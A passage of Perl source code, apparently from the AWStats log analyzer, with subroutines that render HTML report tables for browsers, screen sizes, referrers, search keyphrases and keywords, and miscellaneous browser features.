\t\t\t\\@valcolor,\n\t\t\t\t0,              \t\t0,\n\t\t\t\t0,          \t\t\t\\@valdata\n\t\t\t);\n\t\t\tprint \"</td></tr>\";\n\t\t}\n\t}\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"$WIDTHCOLICON\\\">&nbsp;</th><th>$Message[21]</th><th width=\\\"80\\\">$Message[111]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $total_p = 0;\n\tmy $count = 0;\n\tforeach my $key (@keylist) {\n\t\tmy $p_h = '&nbsp;';\n\t\tmy $p_p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p_h = int( $new_browser_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p_h = \"$p_h %\";\n\t\t}\n\t\tif ($Totalp) {\n\t\t\t$p_p = int( $new_browser_p{$key} / $Totalp * 1000 ) / 10;\n\t\t\t$p_p = \"$p_p %\";\n\t\t}\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/unknown.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td><td width=\\\"80\\\">?</td>\"\n\t\t\t  . \"<td>\".Format_Number($_browser_p{$key}).\"</td><td>$p_p</td>\"\n\t\t\t  . \"<td>\".Format_Number($_browser_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\telse {\n\t\t\tmy $keywithoutcumul = $key;\n\t\t\t$keywithoutcumul =~ s/cumul$//i;\n\t\t\tmy $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}\n\t\t\t  || $keywithoutcumul;\n\t\t\tmy $nameicon = $BrowsersHashIcon{$keywithoutcumul}\n\t\t\t  || \"notavailable\";\n\t\t\tif ( $BrowsersFamily{$keywithoutcumul} ) {\n\t\t\t\t$libbrowser = \"<b>$libbrowser</b>\";\n\t\t\t}\n\t\t\tprint \"<tr><td\"\n\t\t\t  . ( $count ? \"\" : \" width=\\\"$WIDTHCOLICON\\\"\" )\n\t\t\t  . \"><img src=\\\"$DirIcons\\/browser\\/$nameicon.png\\\"\"\n\t\t\t  . AltTitle(\"\")\n\t\t\t  . \" /></td><td class=\\\"aws\\\">\"\n\t\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t\t  . \"$libbrowser\"\n\t\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . (\n\t\t\t\t$BrowsersHereAreGrabbers{$key}\n\t\t\t\t? \"<b>$Message[112]</b>\"\n\t\t\t\t: \"$Message[113]\"\n\t\t\t  )\n\t\t\t  . \"</td><td>\".Format_Number($new_browser_p{$key}).\"</td><td>$p_p</td><td>\".Format_Number($new_browser_h{$key}).\"</td><td>$p_h</td></tr>\\n\";\n\t\t}\n\t\t$total_h += $new_browser_h{$key};\n\t\t$total_p += $new_browser_p{$key};\n\t\t$count++;\n\t}\n\tif ($Debug) {\n\t\tdebug( \"Total real / shown : $Totalh / $total_h\", 2 );\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tmy $rest_p = $Totalp - $total_p;\n\tif ( $rest_h > 0 ) {\n\t\tmy $p_p = 0.0;\n\t\tmy $p_h;\n\t\tif ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tif ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }\n\t\tprint \"<tr>\";\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td><td>&nbsp;</td><td>$rest_p</td>\";\n\t\tprint \"<td>$p_p %</td><td>$rest_h</td><td>$p_h %</td></tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the ScreenSize chart and table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainScreenSize{\n\tif ($Debug) { debug( \"ShowScreenSizeStats\", 2 ); }\n\tprint \"$Center<a name=\\\"screensizes\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalh = 0;\n\tforeach ( keys %_screensize_h ) { $Totalh += $_screensize_h{$_}; }\n\tmy $title =\n\t  \"$Message[135] ($Message[77] $MaxNbOf{'ScreenSizesShown'})\";\n\t&tab_head( \"$title\", 0, 0, 'screensizes' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[135]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\tmy $total_h = 0;\n\tmy $count   = 0;\n\t&BuildKeyList( $MaxNbOf{'ScreenSizesShown'},\n\t\t$MinHit{'ScreenSize'}, \\%_screensize_h, \\%_screensize_h );\n\n\tforeach my $key (@keylist) {\n\t\tmy $p = '&nbsp;';\n\t\tif ($Totalh) {\n\t\t\t$p = int( $_screensize_h{$key} / $Totalh * 1000 ) / 10;\n\t\t\t$p = \"$p %\";\n\t\t}\n\t\t$total_h += $_screensize_h{$key} || 0;\n\t\tprint \"<tr>\";\n\t\tif ( $key eq 'Unknown' ) {\n\t\t\tprint\n\"<td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[0]</span></td>\";\n\t\t\tprint \"<td>$p</td>\";\n\t\t}\n\t\telse {\n\t\t\tmy $screensize = $key;\n\t\t\tprint \"<td class=\\\"aws\\\">$screensize</td>\";\n\t\t\tprint \"<td>$p</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\t$count++;\n\t}\n\tmy $rest_h = $Totalh - $total_h;\n\tif ( $rest_h > 0 ) {    # All others sessions\n\t\tmy $p = 0;\n\t\tif ($Totalh) { $p = int( $rest_h / $Totalh * 1000 ) / 10; }\n\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tprint \"<td>\" . ( $rest_h ? \"$p %\" : \"&nbsp;\" ) . \"</td>\";\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Referrers chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainReferrers{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($Debug) { debug( \"ShowOriginStats\", 2 ); }\n\tprint \"$Center<a name=\\\"referer\\\">&nbsp;</a><br />\\n\";\n\tmy $Totalp = 0;\n\tforeach ( 0 .. 5 ) {\n\t\t$Totalp +=\n\t\t  ( $_ != 4 || $IncludeInternalLinksInOriginSection )\n\t\t  ? $_from_p[$_]\n\t\t  : 0;\n\t}\n\tmy $Totalh = 0;\n\tforeach ( 0 .. 5 ) {\n\t\t$Totalh +=\n\t\t  ( $_ != 4 || $IncludeInternalLinksInOriginSection )\n\t\t  ? $_from_h[$_]\n\t\t  : 0;\n\t}\n\n    my $title = \"$Message[36]\";\n\n    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {\n       # extend the title to include the added link\n           $title .= \" &nbsp; - &nbsp; <a href=\\\"\" . (XMLEncode(\n               \"$AddLinkToExternalCGIWrapper\" . \"?section=ORIGIN&baseName=$DirData/$PROG\"\n           . \"&month=$MonthRequired&year=$YearRequired&day=$DayRequired\"\n           . \"&siteConfig=$SiteConfig\" )\n           . \"\\\"$NewLinkTarget>$Message[179]</a>\");\n    }\n        \n\t&tab_head( $title, 19, 0, 'referer' );\n\tmy @p_p = ( 0, 0, 0, 0, 0, 0 );\n\tif ( $Totalp > 0 ) {\n\t\t$p_p[0] = int( $_from_p[0] / $Totalp * 1000 ) / 10;\n\t\t$p_p[1] = int( $_from_p[1] / $Totalp * 1000 ) / 10;\n\t\t$p_p[2] = int( $_from_p[2] / $Totalp * 1000 ) / 10;\n\t\t$p_p[3] = int( $_from_p[3] / $Totalp * 1000 ) / 10;\n\t\t$p_p[4] = int( $_from_p[4] / $Totalp * 1000 ) / 10;\n\t\t$p_p[5] = int( $_from_p[5] / $Totalp * 1000 ) / 10;\n\t}\n\tmy @p_h = ( 0, 0, 0, 0, 0, 0 );\n\tif ( $Totalh > 0 ) {\n\t\t$p_h[0] = int( $_from_h[0] / $Totalh * 1000 ) / 10;\n\t\t$p_h[1] = int( $_from_h[1] / $Totalh * 1000 ) / 10;\n\t\t$p_h[2] = int( $_from_h[2] / $Totalh * 1000 ) / 10;\n\t\t$p_h[3] = int( $_from_h[3] / $Totalh * 1000 ) / 10;\n\t\t$p_h[4] = int( $_from_h[4] / $Totalh * 1000 ) / 10;\n\t\t$p_h[5] = int( $_from_h[5] / $Totalh * 1000 ) / 10;\n\t}\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[37]</th>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[56]</th><th bgcolor=\\\"#$color_p\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint\n\"<th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[57]</th><th bgcolor=\\\"#$color_h\\\" width=\\\"80\\\">$Message[15]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by direct address/bookmark/link in email/etc...\n\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[38]</b></td>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_p[0] ? Format_Number($_from_p[0]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_p[0] ? \"$p_p[0] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_h[0] ? Format_Number($_from_h[0]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_h[0] ? \"$p_h[0] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by search engines\n\tprint \"<tr\"\n\t  . Tooltip(13)\n\t  . \"><td class=\\\"aws\\\"><b>$Message[40]</b> - <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=refererse\")\n\t\t: \"$StaticLinks.refererse.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a><br />\\n\";\n\tif ( scalar keys %_se_referrals_h ) {\n\t\tprint \"<table>\\n\";\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'},\n\t\t\t$MinHit{'Refer'},\n\t\t\t\\%_se_referrals_h,\n\t\t\t(\n\t\t\t\t( scalar keys %_se_referrals_p )\n\t\t\t\t? \\%_se_referrals_p\n\t\t\t\t: \\%_se_referrals_h\n\t\t\t)\n\t\t);\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $newreferer = $SearchEnginesHashLib{$key}\n\t\t\t  || CleanXSS($key);\n\t\t\tprint \"<tr><td class=\\\"aws\\\">- $newreferer</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\tFormat_Number($_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' ))\n\t\t\t  . \"</td>\";\n\t\t\tprint \"<td> / \".Format_Number($_se_referrals_h{$key}).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p += $_se_referrals_p{$key};\n\t\t\t$total_h += $_se_referrals_h{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Total real / shown : $TotalSearchEnginesPages / $total_p -  $TotalSearchEnginesHits / $total_h\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t\tmy $rest_p = $TotalSearchEnginesPages - $total_p;\n\t\tmy $rest_h = $TotalSearchEnginesHits - $total_h;\n\t\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">- $Message[2]</span></td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t\tprint \"<td> / \".Format_Number($rest_h).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\";\n\t}\n\tprint \"</td>\\n\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[2] ? Format_Number($_from_p[2]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[2] ? \"$p_p[2] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[2] ? Format_Number($_from_h[2]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[2] ? \"$p_h[2] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by external HTML link\n\tprint \"<tr\"\n\t  . Tooltip(14)\n\t  . \"><td class=\\\"aws\\\"><b>$Message[41]</b> - <a href=\\\"\"\n\t  . (\n\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t  || !$StaticLinks\n\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=refererpages\")\n\t\t: \"$StaticLinks.refererpages.$StaticExt\"\n\t  )\n\t  . \"\\\"$NewLinkTarget>$Message[80]</a><br />\\n\";\n\tif ( scalar keys %_pagesrefs_h ) {\n\t\tprint \"<table>\\n\";\n\t\tmy $total_p = 0;\n\t\tmy $total_h = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'},\n\t\t\t$MinHit{'Refer'},\n\t\t\t\\%_pagesrefs_h,\n\t\t\t(\n\t\t\t\t( scalar keys %_pagesrefs_p )\n\t\t\t\t? \\%_pagesrefs_p\n\t\t\t\t: \\%_pagesrefs_h\n\t\t\t)\n\t\t);\n\t\tforeach my $key (@keylist) {\n\t\t\tprint \"<tr><td class=\\\"aws\\\">- \";\n\t\t\t&HTMLShowURLInfo($key);\n\t\t\tprint \"</td>\";\n\t\t\tprint \"<td>\"\n\t\t\t  . Format_Number(( $_pagesrefs_p{$key} ? $_pagesrefs_p{$key} : '0' ))\n\t\t\t  . \"</td>\";\n\t\t\tprint \"<td>\".Format_Number($_pagesrefs_h{$key}).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t\t$total_p += $_pagesrefs_p{$key};\n\t\t\t$total_h += $_pagesrefs_h{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug(\n\"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h\",\n\t\t\t\t2\n\t\t\t);\n\t\t}\n\t\tmy $rest_p = $TotalRefererPages - $total_p;\n\t\tmy $rest_h = $TotalRefererHits - $total_h;\n\t\tif ( $rest_p > 0 || $rest_h > 0 ) {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">- $Message[2]</span></td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_p).\"</td>\";\n\t\t\tprint \"<td>\".Format_Number($rest_h).\"</td>\";\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\t\tprint \"</table>\";\n\t}\n\tprint \"</td>\\n\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[3] ? Format_Number($_from_p[3]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_p[3] ? \"$p_p[3] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[3] ? Format_Number($_from_h[3]) : \"&nbsp;\" )\n\t\t  . \"</td><td valign=\\\"top\\\">\"\n\t\t  . ( $_from_h[3] ? \"$p_h[3] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\n\t#------- Referrals by internal HTML link\n\tif ($IncludeInternalLinksInOriginSection) {\n\t\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[42]</b></td>\";\n\t\tif ( $ShowOriginStats =~ /P/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_from_p[4] ? Format_Number($_from_p[4]) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . ( $_from_p[4] ? \"$p_p[4] %\" : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowOriginStats =~ /H/i ) {\n\t\t\tprint \"<td>\"\n\t\t\t  . ( $_from_h[4] ? Format_Number($_from_h[4]) : \"&nbsp;\" )\n\t\t\t  . \"</td><td>\"\n\t\t\t  . ( $_from_h[4] ? \"$p_h[4] %\" : \"&nbsp;\" ) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\n\t#------- Referrals by news group\n\t#print \"<tr><td class=\\\"aws\\\"><b>$Message[107]</b></td>\";\n\t#if ($ShowOriginStats =~ /P/i) { print \"<td>\".($_from_p[5]?$_from_p[5]:\"&nbsp;\").\"</td><td>\".($_from_p[5]?\"$p_p[5] %\":\"&nbsp;\").\"</td>\"; }\n\t#if ($ShowOriginStats =~ /H/i) { print \"<td>\".($_from_h[5]?$_from_h[5]:\"&nbsp;\").\"</td><td>\".($_from_h[5]?\"$p_h[5] %\":\"&nbsp;\").\"</td>\"; }\n\t#print \"</tr>\\n\";\n\t\n\t#------- Unknown origin\n\tprint \"<tr><td class=\\\"aws\\\"><b>$Message[39]</b></td>\";\n\tif ( $ShowOriginStats =~ /P/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_p[1] ? Format_Number($_from_p[1]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_p[1] ? \"$p_p[1] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tif ( $ShowOriginStats =~ /H/i ) {\n\t\tprint \"<td>\"\n\t\t  . ( $_from_h[1] ? Format_Number($_from_h[1]) : \"&nbsp;\" )\n\t\t  . \"</td><td>\"\n\t\t  . ( $_from_h[1] ? \"$p_h[1] %\" : \"&nbsp;\" ) . \"</td>\";\n\t}\n\tprint \"</tr>\\n\";\n\t&tab_end();\n\n\t# 0: Direct\n\t# 1: Unknown\n\t# 2: SE\n\t# 3: External link\n\t# 4: Internal link\n\t# 5: Newsgroup (deprecated)\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Key Phrases and Keywords chart and table\n# Parameters:   $NewLinkParams, $NewLinkTarget\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainKeys{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\t\n\tif ($ShowKeyphrasesStats) {\n\t\tprint \"$Center<a name=\\\"keyphrases\\\">&nbsp;</a>\";\n\t}\n\tif ($ShowKeywordsStats) {\n\t\tprint \"$Center<a name=\\\"keywords\\\">&nbsp;</a>\";\n\t}\n\tif ( $ShowKeyphrasesStats || $ShowKeywordsStats ) { print \"<br />\\n\"; }\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint\n\t\t  \"<table width=\\\"100%\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\"><tr>\";\n\t}\n\tif ($ShowKeyphrasesStats) {\n\t\t\n\t\t# By Keyphrases\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"<td width=\\\"50%\\\" valign=\\\"top\\\">\\n\";\n\t\t}\n\t\tif ($Debug) { debug( \"ShowKeyphrasesStats\", 2 ); }\n\t\t&tab_head(\n\"$Message[120] ($Message[77] $MaxNbOf{'KeyphrasesShown'})<br /><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=keyphrases\")\n\t\t\t\t: \"$StaticLinks.keyphrases.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\",\n\t\t\t19,\n\t\t\t( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,\n\t\t\t'keyphrases'\n\t\t);\n\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t\t  . Tooltip(15)\n\t\t  . \"><th>$TotalDifferentKeyphrases $Message[103]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t\tmy $total_s = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList( $MaxNbOf{'KeyphrasesShown'},\n\t\t\t$MinHit{'Keyphrase'}, \\%_keyphrases, \\%_keyphrases );\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $mot;\n\n  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t\t$mot = CleanXSS(\n\t\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t}\n\t\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\t\tmy $p;\n\t\t\tif ($TotalKeyphrases) {\n\t\t\t\t$p =\n\t\t\t\t  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t\t  . XMLEncode($mot)\n\t\t\t  . \"</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\\n\";\n\t\t\t$total_s += $_keyphrases{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug( \"Total real / shown : $TotalKeyphrases / $total_s\", 2 );\n\t\t}\n\t\tmy $rest_s = $TotalKeyphrases - $total_s;\n\t\tif ( $rest_s > 0 ) {\n\t\t\tmy $p;\n\t\t\tif ($TotalKeyphrases) {\n\t\t\t\t$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[124]</span></td><td>$rest_s</td>\";\n\t\t\tprint \"<td>$p&nbsp;%</td></tr>\\n\";\n\t\t}\n\t\t&tab_end();\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t}\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint \"<td> &nbsp; </td>\";\n\t}\n\tif ($ShowKeywordsStats) {\n\n\t\t# By Keywords\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"<td width=\\\"50%\\\" valign=\\\"top\\\">\\n\";\n\t\t}\n\t\tif ($Debug) { debug( \"ShowKeywordsStats\", 2 ); }\n\t\t&tab_head(\n\"$Message[121] ($Message[77] $MaxNbOf{'KeywordsShown'})<br /><a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=keywords\")\n\t\t\t\t: \"$StaticLinks.keywords.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\",\n\t\t\t19,\n\t\t\t( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,\n\t\t\t'keywords'\n\t\t);\n\t\tprint \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"\"\n\t\t  . Tooltip(15)\n\t\t  . \"><th>$TotalDifferentKeywords $Message[13]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[14]</th><th bgcolor=\\\"#$color_s\\\" width=\\\"80\\\">$Message[15]</th></tr>\\n\";\n\t\tmy $total_s = 0;\n\t\tmy $count = 0;\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keywords, \\%_keywords );\n\t\tforeach my $key (@keylist) {\n\t\t\tmy $mot;\n\n  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.\n\t\t\tif ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {\n\t\t\t\t$mot = CleanXSS(\n\t\t\t\t\tDecodeKey_decodeutfkeys(\n\t\t\t\t\t\t$key, $PageCode || 'iso-8859-1'\n\t\t\t\t\t)\n\t\t\t\t);\n\t\t\t}\n\t\t\telse { $mot = CleanXSS( DecodeEncodedString($key) ); }\n\t\t\tmy $p;\n\t\t\tif ($TotalKeywords) {\n\t\t\t\t$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint \"<tr><td class=\\\"aws\\\">\"\n\t\t\t  . XMLEncode($mot)\n\t\t\t  . \"</td><td>$_keywords{$key}</td><td>$p %</td></tr>\\n\";\n\t\t\t$total_s += $_keywords{$key};\n\t\t\t$count++;\n\t\t}\n\t\tif ($Debug) {\n\t\t\tdebug( \"Total real / shown : $TotalKeywords / $total_s\", 2 );\n\t\t}\n\t\tmy $rest_s = $TotalKeywords - $total_s;\n\t\tif ( $rest_s > 0 ) {\n\t\t\tmy $p;\n\t\t\tif ($TotalKeywords) {\n\t\t\t\t$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\"><span style=\\\"color: #$color_other\\\">$Message[30]</span></td><td>$rest_s</td>\";\n\t\t\tprint \"<td>$p %</td></tr>\\n\";\n\t\t}\n\t\t&tab_end();\n\t\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t}\n\tif ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {\n\t\tprint \"</tr></table>\\n\";\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the miscellaneous table\n# Parameters:   -\n# Input:        -\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainMisc{\n\tif ($Debug) { debug( \"ShowMiscStats\", 2 ); }\n\tprint \"$Center<a name=\\\"misc\\\">&nbsp;</a><br />\\n\";\n\tmy $title = \"$Message[139]\";\n\t&tab_head( \"$title\", 19, 0, 'misc' );\n\tprint\n\t  \"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th>$Message[139]</th>\";\n\tprint \"<th width=\\\"100\\\">&nbsp;</th>\";\n\tprint \"<th width=\\\"100\\\">&nbsp;</th>\";\n\tprint \"</tr>\\n\";\n\tmy %label = (\n\t\t'AddToFavourites'           => $Message[137],\n\t\t'JavascriptDisabled'        => $Message[168],\n\t\t'JavaEnabled'               => $Message[140],\n\t\t'DirectorSupport'           => $Message[141],\n\t\t'FlashSupport'              => $Message[142],\n\t\t'RealPlayerSupport'         => $Message[143],\n\t\t'QuickTimeSupport'          => $Message[144],\n\t\t'WindowsMediaPlayerSupport' => $Message[145],\n\t\t'PDFSupport'                => $Message[146]\n\t);\n\n\tforeach my $key (@MiscListOrder) {\n\t\tmy $mischar = substr( $key, 0, 1 );\n\t\tif ( $ShowMiscStats !~ /$mischar/i ) { next; }\n\t\tmy $total = 0;\n\t\tmy $p;\n\t\tif ( $MiscListCalc{$key} eq 'v' ) { $total = $TotalVisits; }\n\t\tif ( $MiscListCalc{$key} eq 'u' ) { $total = $TotalUnique; }\n\t\tif ( $MiscListCalc{$key} eq 'hm' ) {\n\t\t\t$total = $_misc_h{'TotalMisc'} || 0;\n\t\t}\n\t\tif ($total) {\n\t\t\t$p =\n\t\t\t  int( ( $_misc_h{$key} ? $_misc_h{$key} : 0 ) / $total *\n\t\t\t\t  1000 ) / 10;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tprint \"<td class=\\\"aws\\\">\"\n\t\t  . ( $PageDir eq 'rtl' ? \"<span dir=\\\"ltr\\\">\" : \"\" )\n\t\t  . $label{$key}\n\t\t  . ( $PageDir eq 'rtl' ? \"</span>\" : \"\" ) . 